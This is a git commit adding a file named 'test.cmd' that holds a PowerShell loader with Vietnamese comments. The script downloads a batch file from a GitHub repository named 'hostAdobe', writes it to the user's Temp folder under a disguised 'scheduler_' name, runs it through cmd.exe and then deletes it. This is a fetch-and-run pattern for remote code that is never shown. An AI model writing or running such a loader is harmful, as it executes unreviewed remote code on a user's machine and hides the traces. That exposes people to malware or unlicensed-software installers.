1c265d5f3f39d9435b98dd8a49e51e14213ff870
minhtuan283 <tanghuynhminhtuan@gmail.com>
2024-12-20 17:00:35 +0700

    Create test.cmd

---
+++ test.cmd
@@ -0,0 +1,30 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Danh sách URL chứa file thực thi
+$URLs = @(
+    'https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/test.bat'
+)
+
+# Tải nội dung từ URL
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try {
+        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
+        break
+    } catch {}
+}
+
+if (-not $response) {
+    Write-Host "Failed to retrieve the script from the available repository, aborting!"
+    return
+}
+
+# Tạo file tạm để lưu nội dung script
+$rand = [Guid]::NewGuid().Guid
+$FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
+Set-Content -Path $FilePath -Value $response.Content
+
+# Thực thi file batch
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait
+
+# Xóa file tạm sau khi thực thi
+Remove-Item -Path $FilePath
